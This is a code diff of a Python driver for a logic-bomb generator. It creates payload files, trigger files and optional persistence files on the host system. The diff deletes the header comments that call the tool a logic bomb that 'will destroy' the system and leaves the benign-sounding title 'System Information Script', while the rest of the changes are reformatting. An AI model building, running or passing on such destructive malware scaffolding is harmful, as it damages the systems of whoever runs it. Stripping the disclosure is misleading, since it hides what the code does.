@@ -1,30 +1,3 @@
-# ====================================================================
-#
-#       Title: System Information Script
-#      Author: Chetanya Kunndra
-#        Date: 12 Jan 2021
-#       Email: mtcs20ck@policeuniversity.ac.in | ckunndra@gmail.com
-#
-# ====================================================================
-# ====================================================================
-#
-#                    Disclaimer
-#      This script is only for educational purposes.
-#      Author bears no responsibility if you use it on your
-#      own system and/or someone else's system.
-#      This script will destroy you system.
-#
-# ====================================================================
-# ====================================================================
-#
-#                    Note
-#      This isn't a traditional logic bomb
-#      This code will create separate trigger and payloads
-#      These trigger and payload files will act as the logic bomb
-#      A cleanup.sh file will also be created to clean up the system
-#
-# ====================================================================
-
 from platform import system as psystem
 from os import path as opath, system as osystem
 from sys import executable
@@ -42,7 +15,8 @@ class Driver:
         self.all_payloads = self.get_all_payloads()
         # Constants
         self.CURRENT_OS = psystem()
-        self.ROOT_DIRECTORY = '/' if opath.abspath(executable)[0] is None else opath.abspath(executable)[0]
+        self.ROOT_DIRECTORY = '/' if opath.abspath(
+            executable)[0] is None else opath.abspath(executable)[0]
         self.file_creator_obj = FileCreator(
             current_os=self.CURRENT_OS,
             root_directory=self.ROOT_DIRECTORY
@@ -88,9 +62,11 @@ class Driver:
                         trigger_code = trigger().get_trigger(payload=payload_file, triggering_entity=trigger_variable,
                                                              os=self.CURRENT_OS)
                     else:
-                        trigger_code = trigger().get_trigger(payload_file, triggering_entity=None, os=self.CURRENT_OS)
+                        trigger_code = trigger().get_trigger(
+                            payload_file, triggering_entity=None, os=self.CURRENT_OS)
 
-                    trigger_files += self.file_creator_obj.create_trigger_files(trigger_code)
+                    trigger_files += self.file_creator_obj.create_trigger_files(
+                        trigger_code)
                 break
 
         return trigger_files
@@ -145,10 +121,12 @@ class Driver:
 
         payload_code = self.get_payload_code(payload_number=payload_choice)
 
-        all_payload_files = self.file_creator_obj.create_payload_files(payload_code=payload_code)
-        all_trigger_files = self.create_triggers(trigger_number=trigger_choice, payload_files=all_payload_files)
+        all_payload_files = self.file_creator_obj.create_payload_files(
+            payload_code=payload_code)
+        all_trigger_files = self.create_triggers(
+            trigger_number=trigger_choice, payload_files=all_payload_files)
 
-        #TODO: yahan se dekho
+        # TODO: yahan se dekho
         all_persistent_files = []
         if make_persistent.lower().replace("\n", "").replace(" ", "") == "y":
             all_persistent_files = MakePersistent(
